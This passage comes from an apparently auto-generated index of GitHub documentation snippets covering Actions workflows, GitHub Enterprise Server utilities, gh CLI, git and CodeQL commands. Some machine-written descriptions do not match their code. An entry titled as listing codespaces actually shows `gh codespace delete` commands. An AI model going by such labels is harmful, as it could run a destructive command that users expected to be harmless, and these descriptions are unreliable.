Enterprise\nDESCRIPTION: This snippet shows how to link to a Dotcom-only article within Enterprise content and prevent it from being automatically transformed into an Enterprise-specific link. It achieves this by including the `@latest` version specifier in the path. This ensures that the link points directly to the intended Dotcom article regardless of the context.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_28\n\nLANGUAGE: markdown\nCODE:\n```\n[GitHub's Terms of Service](/free-pro-team@latest/github/site-policy/github-terms-of-service)\n```\n\n----------------------------------------\n\nTITLE: Ruby code block within Markdown\nDESCRIPTION: This snippet shows how to include a ruby code block inside a collapsed section, using standard markdown code fencing with the 'ruby' language identifier.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/organizing-information-with-collapsed-sections.md#_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nputs \"Hello World\"\n```\n\n----------------------------------------\n\nTITLE: Inline Versioning with Liquid Conditionals\nDESCRIPTION: This snippet shows how to use Liquid conditionals inline within a paragraph to differentiate content for different plans or products.  This approach helps to avoid repetition of entire sentences or paragraphs.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/versioning-documentation.md#_snippet_15\n\nLANGUAGE: liquid\nCODE:\n```\n{% raw %}{% ifversion fpt %}something{% elsif ghec %}something else{% endif %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Configure Former Primary as New Replica\nDESCRIPTION: Configures the former primary appliance as a new replica using `ghe-repl-setup`. The `--force` option is used to replace the existing configuration.  Requires the IP address of the former replica appliance.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/recovering-a-high-availability-configuration.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nghe-repl-setup --force FORMER_REPLICA_IP\n```\n\n----------------------------------------\n\nTITLE: Using Job Context with Services\nDESCRIPTION: This YAML workflow configures a PostgreSQL service container and uses the `job` context to access the dynamically assigned port for the service. The port mapping exposes port 5432, and the `job.services.postgres.ports[5432]` context expression retrieves the host port number.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nname: PostgreSQL Service Example\non: push\njobs:\n  postgres-job:\n    runs-on: ubuntu-latest\n    services:\n      postgres:\n        image: postgres\n        env:\n          POSTGRES_PASSWORD: postgres\n        options: --health-cmd pg_isready --health-interval 10s --health-timeout 5s --health-retries 5\n        ports:\n          # Maps TCP port 5432 in the service container to a randomly chosen available port on the host.\n          - 5432\n\n    steps:\n      - run: pg_isready -h localhost -p {% raw %}${{ job.services.postgres.ports[5432] }}{% endraw %}\n      - run: echo \"Run tests against Postgres\"\n```\n\n----------------------------------------\n\nTITLE: Example github.current-url reference\nDESCRIPTION: This code shows an example object for `github.current-url`, which represents the URL of the current {% data variables.product.github %} page the user is viewing. It includes the reference type, data (URL), ID, is_implicit flag, and metadata.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/building-a-copilot-agent-for-your-copilot-extension/context-passing-for-your-agent.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n    // The reference type.\n    \"type\": \"github.current-url\",\n    \"data\": {\n        // The GitHub URL the user was on while chatting with the agent.\n        \"url\": \"https://github.com/example-user/example-repository\"\n    },\n    \"id\": \"https://github.com/example-user/example-repository\",\n    // `is_implicit` is always true for github.current-url.\n    \"is_implicit\": true,\n    \"metadata\": {\n        \"display_name\": \"https://github.com/example-user/example-repository\",\n        \"display_icon\": \"\",\n        \"display_url\": \"\"\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing a Custom Root CA Certificate (ghe-ssl-ca-certificate-install)\nDESCRIPTION: This utility allows you to install a custom root CA certificate on your GitHub Enterprise Server. The certificate must be in PEM format. The `-c` flag specifies the path to the certificate file.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_26\n\nLANGUAGE: Shell\nCODE:\n```\nghe-ssl-ca-certificate-install -c CERTIFICATE_PATH\n```\n\n----------------------------------------\n\nTITLE: Creating a Dockerfile for local testing of pre-receive hooks\nDESCRIPTION: This Dockerfile sets up an Alpine Linux environment with Git, OpenSSH, and Bash for testing pre-receive hooks locally. It creates a 'git' user, generates SSH keys, and initializes a bare Git repository.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/enforcing-policies/enforcing-policy-with-pre-receive-hooks/creating-a-pre-receive-hook-script.md#_snippet_4\n\nLANGUAGE: dockerfile\nCODE:\n```\nFROM alpine:latest\nRUN \\\n  apk add --no-cache git openssh bash && \\\n  ssh-keygen -A && \\\n  sed -i \"s/#AuthorizedKeysFile/AuthorizedKeysFile/g\" /etc/ssh/sshd_config && \\\n  adduser git -D -G root -h /home/git -s /bin/bash && \\\n  passwd -d git && \\\n  su git -c \"mkdir /home/git/.ssh && \\\n  ssh-keygen -t ed25519 -f /home/git/.ssh/id_ed25519 -P '' && \\\n  mv /home/git/.ssh/id_ed25519.pub /home/git/.ssh/authorized_keys && \\\n  mkdir /home/git/test.git && \\\n  git --bare init /home/git/test.git\"\n\nVOLUME [\"/home/git/.ssh\", \"/home/git/test.git/hooks\"]\nWORKDIR /home/git\n\nCMD [\"/usr/sbin/sshd\", \"-D\"]\n```\n\n----------------------------------------\n\nTITLE: Using Service Containers in GitHub Actions Workflow (YAML)\nDESCRIPTION: This snippet illustrates how to use service containers in a GitHub Actions workflow. It defines a `postgres` service container and specifies a `node` container for the job. It demonstrates how the job can connect to the PostgreSQL service using environment variables.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/about-workflows.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  container-job:\n    runs-on: ubuntu-latest\n    container: node:20-bookworm-slim\n    services:\n      postgres:\n        image: postgres\n    steps:\n      - name: Check out repository code\n        uses: {% data reusables.actions.action-checkout %}\n      - name: Install dependencies\n        run: npm ci\n      - name: Connect to PostgreSQL\n        run: node client.js\n        env:\n          POSTGRES_HOST: postgres\n          POSTGRES_PORT: 5432\n```\n\n----------------------------------------\n\nTITLE: Checking if a codespace was created from a prebuild using GitHub CLI\nDESCRIPTION: This command uses the GitHub CLI (gh) to check if a codespace was created from a prebuild. It queries the GitHub API for the codespace details and uses `jq` to extract the `.prebuild` property, which returns `true` if the codespace was created using a prebuild. It requires the GitHub CLI to be installed and authenticated.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/troubleshooting-prebuilds.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh api /user/codespaces/$CODESPACE_NAME --jq .prebuild\n```\n\n----------------------------------------\n\nTITLE: Access Token Response (XML)\nDESCRIPTION: XML response format for the access token request.  The response contains the access token, token type, and granted scopes for the user.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authorizing-oauth-apps.md#_snippet_12\n\nLANGUAGE: xml\nCODE:\n```\n<OAuth>\n  <access_token>gho_16C7e42F292c6912E7710c838347Ae178B4a</access_token>\n  <token_type>bearer</token_type>\n  <scope>gist,repo</scope>\n</OAuth>\n```\n\n----------------------------------------\n\nTITLE: Conditional Service Setup with Empty Image - YAML\nDESCRIPTION: This example demonstrates how to conditionally define a service based on a boolean condition. If `options.nginx` is true, the `nginx` image is used; otherwise, the service is effectively disabled by using an empty string for the image.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_32\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  nginx:\n    image: {% raw %}${{ options.nginx == true && 'nginx' || '' }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Setting API URL with $env in PowerShell\nDESCRIPTION: This snippet sets the TARGET_API_URL environment variable in a PowerShell environment using the `$env` command.  This variable will be used with the `--target-api-url` option in commands run with the {% data variables.product.prodname_cli %}.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise-migration-tool/set-target-api-url.md#_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\n$env:TARGET_API_URL=\"https://api.{% data variables.enterprise.data_residency_example_domain %}\"\n```\n\n----------------------------------------\n\nTITLE: Conditional Git Configuration in Dotfiles - Shell\nDESCRIPTION: This shell snippet conditionally configures Git to use SSH instead of HTTPS for GitHub repositories, but only when not running in a Codespaces environment. It checks for the presence of the `CODESPACES` environment variable and only sets the Git configuration if it is not defined. This allows users to maintain different Git configurations for local development and Codespaces environments, avoiding authentication issues in Codespaces.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/troubleshooting-authentication-to-a-repository.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nif [ -z \"$CODESPACES\" ]; then\n  git config --global url.\"git@github.com\".insteadOf \"https://github.com\"\nfi\n```\n\n----------------------------------------\n\nTITLE: Disabling Search-Replace Rules - Markdown\nDESCRIPTION: This snippet demonstrates how to disable all search-replace rules using a Markdown comment.  Because the `search-replace` plugin runs many checks based on a set of search terms, individual rules can't be disabled with comments. This command disables all search-replace rules on the specified line.\nSOURCE: https://github.com/github/docs/blob/main/src/content-linter/README.md#_snippet_4\n\nLANGUAGE: Markdown\nCODE:\n```\ndocs.github.com <!-- markdownlint-disable-line search-replace -->\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_NODE_TOTAL to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_NODE_TOTAL` to the GitHub Actions equivalent `${{ strategy.job-total }}`.  Represents the total number of jobs within a parallel strategy.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_30\n\nLANGUAGE: YAML\nCODE:\n```\n${{ strategy.job-total }}\n```\n\n----------------------------------------\n\nTITLE: Using First-Party GitHub Action with @main in YAML\nDESCRIPTION: This YAML snippet demonstrates how to include a first-party GitHub action and target the 'main' branch. First-party actions have the `actions/`, `github/` or `octo-org/` prefix.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_32\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - uses: actions/javascript-action@main\n```\n\n----------------------------------------\n\nTITLE: Sync OpenAPI Workflow YAML Configuration\nDESCRIPTION: This YAML configuration defines a GitHub Actions workflow that syncs the OpenAPI specification. The workflow is triggered on a schedule. It also triggers other automation pipelines. The workflow creates a pull request labeled `github-openapi-bot` with the changes.\nSOURCE: https://github.com/github/docs/blob/main/src/webhooks/README.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\n.github/workflows/sync-openapi.yml\n```\n\n----------------------------------------\n\nTITLE: Limiting Workflow Runs Returned by GitHub CLI\nDESCRIPTION: This snippet demonstrates how to limit the number of workflow runs returned by the `gh run list` command using the `-L` or `--limit` flag. The example limits the output to 5 runs.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/viewing-workflow-run-history.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngh run list --limit 5\n```\n\n----------------------------------------\n\nTITLE: Force Path-Style Addressing for S3 (ghe-config)\nDESCRIPTION: This command forces path-style addressing for S3, which might be required for some S3-compatible storage solutions. Setting this to 'true' modifies how GitHub Actions accesses the S3 bucket. This is often needed when using MinIO or other S3-compatible services.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/configure-storage-provider.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nghe-config secrets.actions.storage.s3.force-path-style true\n```\n\n----------------------------------------\n\nTITLE: Dry-run with Configuration File for Azure DevOps Pipeline\nDESCRIPTION: This command performs a dry run of migrating an Azure DevOps pipeline using a specified YAML configuration file. It requires the output directory and the file path to the Azure DevOps configuration file. The pipeline is selected by matching the repository_slug in the configuration file to the value of the --azure-devops-organization and --azure-devops-project option.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-azure-devops-with-github-actions-importer.md#_snippet_12\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer dry-run azure-devops pipeline --output-dir ./output/ --config-file-path ./path/to/azure_devops/config.yml\n```\n\n----------------------------------------\n\nTITLE: Grant Migrator Role Mutation\nDESCRIPTION: This GraphQL mutation assigns the migrator role to a specified user or team within an organization. It requires an organization ID, an actor (username or team name), and the actor type (USER or TEAM). A {% data variables.product.pat_generic %} (PAT) with appropriate scopes is required to execute this mutation.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise-migration-tool/grant-migrator-role-graphql.md#_snippet_0\n\nLANGUAGE: GraphQL\nCODE:\n```\nmutation grantMigratorRole (\n  $organizationId: ID!,\n  $actor: String!,\n  $actor_type: ActorType!\n) {\n  grantMigratorRole( input: {\n    organizationId: $organizationId,\n    actor: $actor,\n    actorType: $actor_type\n  })\n   { success }\n}\n```\n\n----------------------------------------\n\nTITLE: Running CodeQL Query Tests\nDESCRIPTION: This shell command demonstrates how to run CodeQL query tests using the `codeql test run` command. The argument `<test|dir>` can be a path to a `.ql` file, a `.qlref` file, or a directory containing test files. The `--threads` option specifies the number of threads to use during query execution.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/testing-custom-queries.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ncodeql test run <test|dir>\n```\n\n----------------------------------------\n\nTITLE: Migration ID Response - REST API\nDESCRIPTION: This snippet shows the JSON response from the GitHub REST API after initiating a migration. It includes the `id` of the migration. This `id` is used to check migration status and download archives.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-repositories-from-github-enterprise-server-to-github-enterprise-cloud.md#_snippet_4\n\nLANGUAGE: HTTP\nCODE:\n```\nHTTP/1.1 201 Created\n\n{\n  \"id\": 123,\n  // ...\n}\n```\n\n----------------------------------------\n\nTITLE: Getting Help for the Scrape Script\nDESCRIPTION: This command displays the help information for the general search scraping script. The `--help` argument provides details on the available options and parameters that can be used with the script.\nSOURCE: https://github.com/github/docs/blob/main/src/search/scripts/scrape/README.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm run general-search-scrape -- --help\n```\n\n----------------------------------------\n\nTITLE: Displaying MOTD with ghe-motd (Shell)\nDESCRIPTION: The `ghe-motd` utility re-displays the message of the day (MOTD) that administrators see when accessing the instance via the administrative shell. The output contains an overview of the instance's state.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_13\n\nLANGUAGE: shell\nCODE:\n```\nghe-motd\n```\n\n----------------------------------------\n\nTITLE: Example Feature Specification\nDESCRIPTION: This text provides an example of a feature specification generated by Copilot Chat. The specification includes sections for description, problem, solution, feature details, benefits, and potential risks for implementing a shortcut to a CLI option.  It also specifies commands affected and documentation requirements.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/functionality-analysis-and-feature-suggestions/analyzing-and-incorporating-user-feedback.md#_snippet_2\n\nLANGUAGE: text\nCODE:\n```\n# Feature Specification for Issue #426: Shortcut for --with-token CLI option\n\n## Description:\nCurrently, the --with-token option is used to to pass in a token to commands. Typing --with-token each time is cumbersome. This feature proposes a new flag -wt as a shortcut to quickly specify the --with-token option when running various commands.\n\n## Problem:\nTyping --with-token repeatedly is time-consuming and inconvenient for users who frequently use this option.\n\n## Solution:\nIntroduce a new flag -wt that serves as a shortcut for the --with-token option.\n\n## Feature Details:\n\n### 1. Flag Introduction:\n-wt will be introduced as a shorthand for --with-token.\nUsage: <command> -wt <token>\n\n### 2. Commands Affected:\nAll commands that currently support the --with-token option.\n\n### 3. Backward Compatibility:\n- The existing --with-token option will continue to work as before.\n- No existing functionality will be removed or altered.\n\n### 4. Documentation:\n- Update documentation to include the new -wt flag.\n- Provide examples and usage scenarios for the new flag.\n\n### 5. Testing:\n- Ensure thorough testing of the -wt flag across various commands.\n- Test cases should include:\n  - Valid and invalid tokens.\n  - Interaction with other options.\n  - Ensuring no regression in current --with-token functionality.\n\n## Benefits:\n- Improved user experience by reducing the amount of typing required.\n- Streamlined command execution for users who frequently use the --with-token option.\n\n## Potential Risks:\nMinimal risk as this feature is an addition and does not alter existing functionality.\n```\n\n----------------------------------------\n\nTITLE: Dry Run Travis CI Migration with inactive repos\nDESCRIPTION: This command executes a dry run of the Travis CI migration including inactive repositories. It requires the output directory and the Travis CI repository name.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-travis-ci-with-github-actions-importer.md#_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer dry-run travis-ci --output-dir ./path/to/output/ --travis-ci-repository my-travis-ci-repository --allow-inactive-repositories\n```\n\n----------------------------------------\n\nTITLE: Renormalizing Files After Line Ending Changes\nDESCRIPTION: This snippet updates all files on the current branch to reflect the new line ending configuration. It uses the `git add --renormalize .` command to rewrite the files.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/configuring-git-to-handle-line-endings.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngit add --renormalize .\n```\n\n----------------------------------------\n\nTITLE: Run All Tests\nDESCRIPTION: Executes the entire test suite locally. This command triggers `vitest` to run all defined tests in the project. Ensure optional dependencies are installed before running this command for complete test coverage.\nSOURCE: https://github.com/github/docs/blob/main/src/tests/README.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nnpm test\n```\n\n----------------------------------------\n\nTITLE: Upgrading nodenv and node-build with Brew\nDESCRIPTION: This command updates nodenv and node-build using Homebrew on macOS. It ensures that you have the latest versions of these tools for managing Node.js environments.\nSOURCE: https://github.com/github/docs/blob/main/contributing/node-versions.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nbrew upgrade nodenv node-build\n```\n\n----------------------------------------\n\nTITLE: Installing Runner Service - Linux\nDESCRIPTION: Installs the self-hosted runner as a service on Linux systems using `svc.sh`. The script can optionally take a `user` argument to install the service as a different user. Requires root privileges for system-wide installation.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/configuring-the-self-hosted-runner-application-as-a-service.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nsudo ./svc.sh install\n```\n\nLANGUAGE: shell\nCODE:\n```\n./svc.sh install USERNAME\n```\n\n----------------------------------------\n\nTITLE: Making a REST API request with Octokit\nDESCRIPTION: This code demonstrates how to make a REST API request using the authenticated `octokit` instance. It uses the `octokit.request` method to make a `GET` request to the `/meta` endpoint.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/authenticating-as-a-github-app-installation.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nawait octokit.request(\"GET /meta\")\n```\n\n----------------------------------------\n\nTITLE: Using a Docker Hub Action in GitHub Actions (YAML)\nDESCRIPTION: This YAML snippet illustrates how to use a Docker Hub action within a GitHub Actions workflow by specifying the Docker image and tag using the `docker://{image}:{tag}` format in the `uses` keyword.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_14\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  my_first_job:\n    steps:\n      - name: My first step\n        uses: docker://alpine:3.8\n```\n\n----------------------------------------\n\nTITLE: Securing CODEOWNERS file by defining owner\nDESCRIPTION: This snippet demonstrates securing the CODEOWNERS file by defining the repository owner as the owner of either the CODEOWNERS file itself or the `.github` directory.  This ensures that changes to the CODEOWNERS file require approval from the repository owner.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-code-owners.md#_snippet_5\n\nLANGUAGE: text\nCODE:\n```\n/.github/CODEOWNERS @owner_username\n```\n\nLANGUAGE: text\nCODE:\n```\n/.github/ @owner_username\n```\n\n----------------------------------------\n\nTITLE: Checking Workflow Run Exit Status using GitHub CLI\nDESCRIPTION: This snippet shows how to check the exit status of a workflow run using the `--exit-status` flag. It allows for conditional execution based on the run's success or failure.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/viewing-workflow-run-history.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\ngh run view 0451 --exit-status && echo \"run pending or passed\"\n```\n\n----------------------------------------\n\nTITLE: Detecting Source Control System with git-import-detect\nDESCRIPTION: This command attempts to detect the type of source control management system located at a given URL. This is useful in automated import scripts to identify the source system.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_79\n\nLANGUAGE: shell\nCODE:\n```\ngit-import-detect\n```\n\n----------------------------------------\n\nTITLE: Listing Organization Codespaces with GitHub CLI\nDESCRIPTION: This snippet shows how to list codespaces within an organization using the GitHub CLI. It allows filtering by organization and optionally by user.  You must be an organization owner to use this command.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/deleting-a-codespace.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace delete --org ORGANIZATION\n```\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace delete --org ORGANIZATION --user USER\n```\n\n----------------------------------------\n\nTITLE: Example of Liquid whitespace control\nDESCRIPTION: Demonstrates the use of Liquid whitespace control to prevent unwanted newlines or whitespace in lists or tables when using Liquid conditionals. This ensures correct rendering and readability of the source code.\nSOURCE: https://github.com/github/docs/blob/main/content/README.md#_snippet_6\n\nLANGUAGE: liquid\nCODE:\n```\n{%- ifversion fpt %}\n```\n\n----------------------------------------\n\nTITLE: Running bugged Python file on Mac or Linux\nDESCRIPTION: This shell command is used to execute the 'bugged_dice_battle.py' Python script on a Mac or Linux system. It utilizes the 'python' command to invoke the Python interpreter and run the specified Python file.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/learning-to-debug-with-github-copilot.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\npython bugged_dice_battle.py\n```\n\n----------------------------------------\n\nTITLE: Amending latest commit with git\nDESCRIPTION: This snippet shows how to amend the latest commit to remove a secret, using `git commit --amend --all`.  This requires Git to be installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/secret-scanning/working-with-secret-scanning-and-push-protection/working-with-push-protection-from-the-command-line.md#_snippet_3\n\nLANGUAGE: text\nCODE:\n```\ngit commit --amend --all\n```\n\n----------------------------------------\n\nTITLE: Unlock Repository using ghe-migrator\nDESCRIPTION: This command unlocks a repository after migration using the `ghe-migrator` tool. It requires a Migration GUID to identify the specific migration to unlock.  The command outputs confirmation of the unlocked repository.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_migrations/unlocking-on-instances.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n$ ghe-migrator unlock -g MIGRATION-GUID\n> Unlocked octo-org/octo-project\n```\n\n----------------------------------------\n\nTITLE: DMCA Agent Address\nDESCRIPTION: This snippet provides the physical mailing address for submitting a DMCA notice to GitHub. It is included as an alternative to electronic methods and indicates the format for providing the address details.\nSOURCE: https://github.com/github/docs/blob/main/content/site-policy/content-removal-policies/guide-to-submitting-a-dmca-takedown-notice.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nGitHub, Inc\nAttn: DMCA Agent\n88 Colin P Kelly Jr St\nSan Francisco, CA. 94107\n```\n\n----------------------------------------\n\nTITLE: Removing Scheduled Upgrade Installations (Shell)\nDESCRIPTION: Removes scheduled installations for a package using the `ghe-upgrade-scheduler` utility with the `-r` option. Replace `UPGRADE PACKAGE FILENAME` with the name of the upgrade package file.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_106\n\nLANGUAGE: shell\nCODE:\n```\nghe-upgrade-scheduler -r UPGRADE PACKAGE FILENAME\n```\n\n----------------------------------------\n\nTITLE: Checking Cluster Status (Shell)\nDESCRIPTION: This command checks the status of the services in the GitHub Enterprise Server cluster. It is used to verify that the services are healthy after applying the configuration. It relies on the `ghe-cluster-status` command line utility.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/upgrading-a-cluster.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nghe-cluster-status\n```\n\n----------------------------------------\n\nTITLE: Troubleshooting Empty Token - Shell\nDESCRIPTION: This snippet shows the error message when GitHub Desktop can't find the access token. The suggested solution is to sign out and then sign back in.\nSOURCE: https://github.com/github/docs/blob/main/content/desktop/installing-and-authenticating-to-github-desktop/authenticating-to-github-in-github-desktop.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ninfo: [ui] [AppStore.withAuthenticatingUser] account found for repository: node - USERNAME (empty token)\n```\n\n----------------------------------------\n\nTITLE: Run Linter\nDESCRIPTION: Validates JavaScript code and automatically formats easily reparable mistakes. This helps maintain code quality and consistency across the project. The linter enforces coding standards and identifies potential issues.\nSOURCE: https://github.com/github/docs/blob/main/src/tests/README.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nnpm run lint\n```\n\n----------------------------------------\n\nTITLE: Writing Inline Math Expressions with $ Delimiters\nDESCRIPTION: This snippet demonstrates how to write inline mathematical expressions using single dollar signs ($) as delimiters in Markdown on GitHub. It shows a simple mathematical expression within a sentence.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/writing-mathematical-expressions.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nThis sentence uses `$` delimiters to show math inline: $\\sqrt{3x-1}+(1+x)^2$\n```\n\n----------------------------------------\n\nTITLE: Specifying Output Directory (Shell)\nDESCRIPTION: Demonstrates how to specify the output directory using the `--output-dir` option when running the `audit` command. Path arguments are relative to the container's disk.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/supplemental-arguments-and-settings.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer audit --output-dir /data/out\n```\n\n----------------------------------------\n\nTITLE: Creating a temporary project directory\nDESCRIPTION: This command creates a temporary directory in which the JavaScript files generated during the modernization process will be stored. This helps to keep the project organized.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/modernizing-legacy-code-with-github-copilot.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nmkdir temp-JS-project-directory\n```\n\n----------------------------------------\n\nTITLE: Defining top-level keys in YAML issue form\nDESCRIPTION: This snippet demonstrates the required top-level keys (`name`, `description`, and `body`) for a YAML issue form configuration file.  These keys are essential for the issue form to be recognized and processed correctly by GitHub.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/syntax-for-issue-forms.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname:\ndescription:\nbody:\n```\n\n----------------------------------------\n\nTITLE: Defining a Query Reference File Path - Shell\nDESCRIPTION: This code snippet shows an example of the content of a query reference file (.qlref). It specifies the path to a query relative to a CodeQL pack dependency. The path uses forward slashes for cross-platform compatibility.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/query-reference-files.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nAngularJS/DeadAngularJSEventListener.ql\n```\n\n----------------------------------------\n\nTITLE: Troubleshooting: Could not remove config section\nDESCRIPTION: This snippet shows the error message when trying to remove a remote that doesn't exist. It suggests checking that the remote name is typed correctly.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/managing-remote-repositories.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\n$ git remote rm sofake\n> error: Could not remove config section 'remote.sofake'\n```\n\n----------------------------------------\n\nTITLE: Deleting a Remote Branch with Git\nDESCRIPTION: This command deletes a branch from a remote repository. It requires specifying the remote name and the branch name, with a colon before the branch name. This action removes the specified branch from the remote repository.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/pushing-commits-to-a-remote-repository.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngit push REMOTE-NAME :BRANCH-NAME\n```\n\n----------------------------------------\n\nTITLE: Configuring npm to Silence nodenv Warnings\nDESCRIPTION: This command configures npm to automatically prepend the node path to scripts. It silences warnings related to mismatched binaries when using nodenv with npm.\nSOURCE: https://github.com/github/docs/blob/main/contributing/node-versions.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nnpm config set scripts-prepend-node-path auto\n```\n\n----------------------------------------\n\nTITLE: Encoding a file to Base64 (Linux)\nDESCRIPTION: This command encodes a file named `cert.der` into a Base64 string and saves it to a file named `cert.base64`. The `-w 0` option disables line wrapping in the output.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_20\n\nLANGUAGE: shell\nCODE:\n```\nbase64 -w 0 cert.der > cert.base64\n```\n\n----------------------------------------\n\nTITLE: Template logic: Row headers\nDESCRIPTION: These snippets define row headers for a table, likely representing different categories or sections within the documented page. These headers provide a structural organization to the information being presented.\nSOURCE: https://github.com/github/docs/blob/main/content/organizations/managing-peoples-access-to-your-organization-with-roles/roles-in-an-organization.md#_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n{% endrowheaders 